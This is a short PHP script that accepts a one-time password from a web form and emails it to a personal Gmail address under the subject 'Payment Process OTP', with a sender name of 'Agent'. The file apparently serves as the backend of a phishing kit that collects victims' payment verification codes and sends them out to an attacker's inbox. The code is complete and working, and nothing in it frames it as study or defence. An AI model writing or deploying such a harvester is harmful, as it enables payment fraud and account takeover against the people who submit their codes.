<?php
// Ensure the script processes only POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Invalid request method"]);
    exit;
}

// Check for the required OTP field
if (empty($_POST['OTP'])) {
    http_response_code(400); // Bad Request
    echo json_encode(["error" => "Missing field: OTP"]);
    exit;
}

// Extract and sanitize inputs
$otp = htmlspecialchars($_POST['OTP'], ENT_QUOTES, 'UTF-8');
$to = 'americanresidence435@gmail.com'; // Recipient email address
$subject = 'Payment Process OTP';
$name = 'Agent'; // Sender's name
$fromEmail = 'agent@americaresides.com'; // Sender's email address

// Prepare email content
$htmlBody = "<h3>You have received a new message.</h3>
    <p><strong>OTP:</strong> $otp</p>";

// Email headers
$headers = "From: $name <$fromEmail>\r\n";
$headers .= "Reply-To: $fromEmail\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

// Send the email
if (mail($to, $subject, $htmlBody, $headers)) {
    echo "success";
} else {
    http_response_code(500); // Internal Server Error
    echo json_encode(["error" => "Message could not be sent."]);
}

exit;
